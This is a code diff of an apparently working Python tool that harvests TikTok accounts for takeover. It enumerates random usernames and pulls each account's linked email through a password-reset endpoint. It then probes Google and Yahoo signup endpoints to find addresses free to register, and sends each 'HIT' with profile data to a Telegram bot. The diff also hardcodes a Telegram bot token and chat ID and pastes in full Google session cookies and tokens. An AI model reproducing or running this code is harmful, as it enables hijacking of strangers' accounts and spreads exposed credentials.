@@ -28,8 +28,6 @@ yy=0
 b = 0
 
 
-
-
 os.system('cls' if os.name=='nt'else'clear')
 
 url = 'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=1&browser_language=ar-AE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&channel=tiktok_web&cookie_enabled=true&cursor=20&device_id=7151371875721430533&device_platform=web_pc&focus_state=true&from_page=search&history_len=20&is_fullscreen=false&is_page_visible=true&keyword={usery}&os=windows&priority_region=&referer=&region=IQ&root_referer=https://www.google.com/&screen_height=1024&screen_width=1280&tz_name=Asia/Baghdad&webcast_language=ar'
@@ -45,8 +43,8 @@ pr = co1.cookies.get_dict()
 msToken = pr['msToken']
 
         
-took =input('Enter Your Token Bot : ')
-idddd =input('Enter Your ID : ')
+took ='5591934454:AAErHu0A9XfCOlThw8Yn5EcjTy-HF8gsqn8'
+idddd ='1548932732'
 
 #################
 
@@ -58,10 +56,12 @@ def zaidk():
     
     global a,m,n,a,p,aaa,aaaa,aa,rr,rrr,r,j,Y,yy,y,idddd,took
     while True:
-        user='qwervbnm'
+        usq='qwerty'
+        usw = 'qwertyuioplkjhgfdsazxcvbnm'
+        ra = str(''.join(random.choice(usw)for i in range(6))).lower()
         num='456789'
         rng=int("".join(random.choice(num)for i in range(1)))
-        usery=str("".join(random.choice(user)for i in range(rng)))
+        usery=str("".join(random.choice(usq)for i in range(rng)))
         
         
         url = f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=1&browser_language=ar-AE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&channel=tiktok_web&cookie_enabled=true&cursor=20&device_id=7151371875721430533&device_platform=web_pc&focus_state=true&from_page=search&history_len=20&is_fullscreen=false&is_page_visible=true&keyword={usery}&os=windows&priority_region=&referer=&region=IQ&root_referer=https://www.google.com/&screen_height=1024&screen_width=1280&tz_name=Asia/Baghdad&webcast_language=ar'
@@ -111,33 +111,58 @@ def zaidk():
                         continue
                     
                     if ('"Sent successfully"') in ree:
-                        url0 = f'https://android.clients.google.com/setup/checkavail'
+                        url0 = 'https://accounts.google.com/_/signup/webusernameavailability?hl=ar&_reqid=475082&rt=j'
                         headers = {
-                        'Content-Length':'98',
-                        'Content-Type':'text/plain; charset=UTF-8',
-                        'Host':'android.clients.google.com',
-                        'Connection':'Keep-Alive',
-                        'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
-                        data= json.dumps({
-                        'username':lm,
-                        'version':'3',
-                        'firstName':'AbaLahb',
-                        'lastName':'AbuJahl'})
+                            'accept': '*/*',
+                            'accept-encoding': 'gzip, deflate, br',
+                            'accept-language': 'en-US,en;q=0.9',
+                            'content-length': '1190',
+                            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                            'cookie': 'SEARCH_SAMESITE=CgQI25YB; HSID=AqVNcLgtyV8qACjl5; SSID=AiNW8hZgJ42pJTUj2; APISID=QWpcaMriU0QKLpYp/AjC54ZWtOzRENNgX8; SAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; __Secure-1PAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; __Secure-3PAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; ACCOUNT_CHOOSER=AFx_qI7F0xHvZRK8KJSe6tz0NrURnzUEwvN4MMYPRIaZwiFyANVBF9uXlDYL9kF-1j0wyelu_fqr153ri1ORaLKdhjv9B1zqV7Nttlu5qLcSiavoIiKPs5nvt0qNp53Dp9hekTjqZYaGdtk77UEMCPU6VvKzK2n5gtttlAA9IOUPjJgDQtAva4IgwfZzC6Qjng-FhLmXvSwi2aSXMMr_HGpvUGryFOfY2dhl-w3_AwnjgNIs0xJyB3GAXLCGNG1p7xjlrlJ3j35czk-j8AZgbsSWDDYsa8m-pw; SID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7H7toj2PuG1CT7RYZ656tzA.; __Secure-1PSID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7ZskS6AGBqxv4R7sFByoTgw.; __Secure-3PSID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7bylvFXShcOWp8xEMoyRYAQ.; LSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqvnwzyEOsjtpz_Xv3YGSMkw.; __Host-1PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqVJM2Mjba_0rnj_DpK7-GcQ.; __Host-3PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqUMoH-tlvVsLba3TIeM8xLg.; 1P_JAR=2022-11-28-17; AEC=AakniGOQHd2YtABZyBR9LGAvOJLjp0xkZ0OPqzrGu6LFT9KbKQTFodmOHg; __Host-GAPS=1:aBoUpYnr12jBFZ_iZDrKVMeNlWM4mjudwFahtCfp5keaEDllyjeCv7YgFni40L0SP85ivw99bMXSROFGUyBFjTB0R1wbFg:8Q3DBwhkEFgTBkRb; NID=511=i7bHDBHZU1IVY6Tux4JU0SZx6J9Pl9grdAYnPr_orMAmES5xzdwRm4EGhIFG8fQ3NiIYMRZW3wUzfa71g2LKw9rjov4HgZtW_PhYxdPQVOK1NZIIdRRGvV1gcyDL81lpEPM7UdDBPSf85v0Z3nIG7aU7iqBag1oR90lU5rLjvXLfYe2rIiW6kLaAfeTv94xqGE8hJyDWGAeiRskQ1zjH4T5bHy6SWVHkcqF_ABaAGkFyb7qzr1_aPjyZd2plSxPtras2HvxCue22Quz1EKY2MKitEyt61VX_CPQMmpZCasXmHhO6w-p_UEYoeQNUX14IvzBu8HCAE_DzTkMpdwhhRq8Dp2Dxy6ZTmfhvIi12SxgIVkgFiYq1hKzAQEI; SIDCC=AIKkIs1N81QwhWri0Bzm-vrZd8ZdIcJEwQhxW5Nq6Fz0ZGYet75_HxakoP7e7FCuuwygEHCFBA; __Secure-1PSIDCC=AIKkIs1zz7mbkrfHGeL2Kc6ha56DRIcm394O1QHjGydZ6iK2E07-NUbA4qBrmwETMvxL9yu71w; __Secure-3PSIDCC=AIKkIs2nVxwPe7zp6d3FIM80oZYUYY-pWAGBtpDrCIFpORKRPEJkQenJ1ZEXQqvUst5tgIW-U70',
+                            'google-accounts-xsrf': '1',
+                            'origin': 'https://accounts.google.com',
+                            'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2Fdeleteaccount&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp',
+                            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+                            'sec-ch-ua-mobile': '?0',
+                            'sec-ch-ua-platform': '"Windows"',
+                            'sec-fetch-dest': 'empty',
+                            'sec-fetch-mode': 'cors',
+                            'sec-fetch-site': 'same-origin',
+                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+                            'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=84bf7e62-6751-416e-bb03-1edc3d7c194a,signin_mode=all_accounts,signout_mode=show_confirmation',
+                            'x-client-data': 'CIi2yQEIo7bJAQjEtskBCKmdygEIqJbLAQiTocsBCMXhzAEIlenMAQjl68wBCO7tzAEI8/HMAQiM98wBCM35zAEI0PrMAQik+8wBCKn8zAEIwIqrAg==',
+
+                            'x-same-domain': '1'}
+                        data ={
+                            'continue': 'https://myaccount.google.com/deleteaccount',
+                            'service': 'accountsettings',
+                            'f.req': f'["TL:ADFpJfN4RVRp-IIIn2iZfL88X6EJH_mnJCHatuWdaugBEMaMnfVIlVYDyuILuNJV","zaa","fdf","{lm}",false,"S302716898:1669657854848764",1]',
+                            'at': 'AFoagUW3jURSo46O8KfZ96FjJv613X4xRg:1669657854874',
+                            'azt': 'AFoagUVcdDPp0WLYJ4W-HDpm0Y9Y_TkciQ:1669657854874',
+                            'cookiesDisabled': 'false',
+                            'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"84bf7e62-6751-416e-bb03-1edc3d7c194a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,false,1,""]',
+                            'gmscoreversion': 'undefined'
+
+                        }
                         try:
-                            res=requests.post(url0,headers=headers,data=data)
+                            res=requests.post(url0,headers=headers,data=data).text
                         except requests.exceptions.ConnectionError as error:
                             continue
-                        if res.json()['status'] =='USERNAME_UNAVAILABLE':
+                        if ('"gf.wuar",2') in res:
                             p+=1
                             os.system('cls' if os.name =='nt'else'clear')
                                         
-                            print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
+                            print(f'\033[1;33m= \033[1;32mGmail \033[1;33m: \033[1;32m<{a}> \033[1;31m<{p}> \033[1;34m<{m}>\n\033[1;33m= \033[1;32mYahoo \033[1;33m: \033[1;32m<{y}> \033[1;31m<{Y}> \033[1;34m<{yy}>\n\033[1;32m= \033[1;33mTelegram  \033[1;32m@\033[1;323mBBPZZ')
+                        elif ('"EmailInvalid"') in res:
+                            p+=1
 
-                        elif res.json()['status'] =='SUCCESS': 
+                        elif ('"gf.wuar",1') in res:
+                            
+                            
                 
                             a+=1
                             os.system('cls' if os.name =='nt'else'clear')
-                            print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
+                            print(f'\033[1;33m= \033[1;32mGmail \033[1;33m: \033[1;32m<{a}> \033[1;31m<{p}> \033[1;34m<{m}>\n\033[1;33m= \033[1;32mYahoo \033[1;33m: \033[1;32m<{y}> \033[1;31m<{Y}> \033[1;34m<{yy}>\n\033[1;32m= \033[1;33mTelegram  \033[1;32m@\033[1;323mBBPZZ')
                             us11 = (user1)
                             
                             ui = f'https://qado-tik-info.reback.repl.co/?user={us11}&sess=8'
@@ -162,7 +187,7 @@ def zaidk():
                         
                             #re2 = requests.get(url2,headers=head2).json()
                                 j+=1
-                                req = f'HIT : {j}\nName : {name}\nEmail : {lm}\nFolloing : {fol}\nFollower : {fols1}\nVideo : {vieod}\nID : {id}\nBio : {bio}\n\nBy : @MVMVP - @FFNZZ'
+                                req = f'HIT : {j}\nName : {name}\nEmail : {lm}\nFolloing : {fol}\nFollower : {fols1}\nVideo : {vieod}\nID : {id}\nBio : {bio}\n\nBy : @BBPZZ - @BBMZZ'
                                 tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={req}')
                                 ru= requests.post(tlg)
                                 
@@ -170,11 +195,11 @@ def zaidk():
                     elif ('"Bind device by email failed"') in ree:
                         m+=1
                         os.system('cls' if os.name =='nt'else'clear')
-                        print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
+                        print(f'\033[1;33m= \033[1;32mGmail \033[1;33m: \033[1;32m<{a}> \033[1;31m<{p}> \033[1;34m<{m}>\n\033[1;33m= \033[1;32mYahoo \033[1;33m: \033[1;32m<{y}> \033[1;31m<{Y}> \033[1;34m<{yy}>\n\033[1;32m= \033[1;33mTelegram  \033[1;32m@\033[1;323mBBPZZ')
                     else:
                         m+=1
                         os.system('cls' if os.name =='nt'else'clear')
-                        print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
+                        print(f'\033[1;33m= \033[1;32mGmail \033[1;33m: \033[1;32m<{a}> \033[1;31m<{p}> \033[1;34m<{m}>\n\033[1;33m= \033[1;32mYahoo \033[1;33m: \033[1;32m<{y}> \033[1;31m<{Y}> \033[1;34m<{yy}>\n\033[1;32m= \033[1;33mTelegram  \033[1;32m@\033[1;323mBBPZZ')
                         
                 if ('@yahoo.com') in lg:
                     url = "https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1656747775&as=a1e67fbb4fffb246cf0244&cp=f2f02d6bfbffb36de1eomw&mas=01cd120efcb179ac1b331e5cecb80282052c2c4c0c66c66c2c4c46"
@@ -211,7 +236,7 @@ def zaidk():
                             'sec-fetch-site': 'same-origin',
                             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                             'x-requested-with': 'XMLHttpRequest'
-            }
+                        }
                         d = {
                             '{"language"':'"en-US","colorDepth":24,"deviceMemory":4,"pixelRatio":1,"hardwareConcurrency":4,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":5,"hash":"2c14024bf8584c3f7f63f24ea490e812"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 4000 Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1600","h":"900"},"availableResolution":{"w":"860","h":"1600"},"ts":{"serve":1668330427973,"render":1668330428925}}',
                             'specId': 'yidregsimplified',
@@ -241,17 +266,17 @@ def zaidk():
                         if ('"IDENTIFIER_NOT_AVAILABLE"') in res:
                             Y+=1
                             os.system('cls'if os.name=='nt'else'claer')
-                            print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
+                            print(f'\033[1;33m= \033[1;32mGmail \033[1;33m: \033[1;32m<{a}> \033[1;31m<{p}> \033[1;34m<{m}>\n\033[1;33m= \033[1;32mYahoo \033[1;33m: \033[1;32m<{y}> \033[1;31m<{Y}> \033[1;34m<{yy}>\n\033[1;32m= \033[1;33mTelegram  \033[1;32m@\033[1;323mBBPZZ')
                         if ('"IDENTIFIER_EXISTS"') in res:
                             Y+=1
                             os.system('cls'if os.name=='nt'else'claer')
-                            print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
+                            print(f'\033[1;33m= \033[1;32mGmail \033[1;33m: \033[1;32m<{a}> \033[1;31m<{p}> \033[1;34m<{m}>\n\033[1;33m= \033[1;32mYahoo \033[1;33m: \033[1;32m<{y}> \033[1;31m<{Y}> \033[1;34m<{yy}>\n\033[1;32m= \033[1;33mTelegram  \033[1;32m@\033[1;323mBBPZZ')
                         if ('"LENGTH_TOO_SHORT"') in res:
                             Y+=1
                             os.system('cls'if os.name=='nt'else'claer')
-                            print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
+                            print(f'\033[1;33m= \033[1;32mGmail \033[1;33m: \033[1;32m<{a}> \033[1;31m<{p}> \033[1;34m<{m}>\n\033[1;33m= \033[1;32mYahoo \033[1;33m: \033[1;32m<{y}> \033[1;31m<{Y}> \033[1;34m<{yy}>\n\033[1;32m= \033[1;33mTelegram  \033[1;32m@\033[1;323mBBPZZ')
                         if ('{"errors":[]}') in res:
-                            us11 = lg.split('@')[0]
+                            us11 = (user1)
                             
                             ui = f'https://qado-tik-info.reback.repl.co/?user={us11}&sess=8'
                             ik = requests.get(ui).text
@@ -276,17 +301,17 @@ def zaidk():
                         
                             #re2 = requests.get(url2,headers=head2).json()
                                 j+=1
-                                req = f'HIT : {j}\nName : {name}\nEmail : {lg}\nFolloing : {fol}\nFollower : {fols1}\nVideo : {vieod}\nID : {id}\nBio : {bio}\n\nBy : @MVMVP - @FFNZZ'
+                                req = f'HIT : {j}\nName : {name}\nEmail : {lg}\nFolloing : {fol}\nFollower : {fols1}\nVideo : {vieod}\nID : {id}\nBio : {bio}\n\nBy : @BBPZZ - @BBMZZ'
                                 tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={req}')
                                 ru= requests.post(tlg)
                                
                                 a+=1
                                 os.system('cls'if os.name=='nt'else'claer')
-                                print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
+                                print(f'\033[1;33m= \033[1;32mGmail \033[1;33m: \033[1;32m<{a}> \033[1;31m<{p}> \033[1;34m<{m}>\n\033[1;33m= \033[1;32mYahoo \033[1;33m: \033[1;32m<{y}> \033[1;31m<{Y}> \033[1;34m<{yy}>\n\033[1;32m= \033[1;33mTelegram  \033[1;32m@\033[1;323mBBPZZ')
                     elif ('"Bind device by email failed"') in ree:
                         yy+=1
                         os.system('cls'if os.name=='nt'else'claer')
-                        print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
+                        print(f'\033[1;33m= \033[1;32mGmail \033[1;33m: \033[1;32m<{a}> \033[1;31m<{p}> \033[1;34m<{m}>\n\033[1;33m= \033[1;32mYahoo \033[1;33m: \033[1;32m<{y}> \033[1;31m<{Y}> \033[1;34m<{yy}>\n\033[1;32m= \033[1;33mTelegram  \033[1;32m@\033[1;323mBBPZZ')
                         
                     
                 
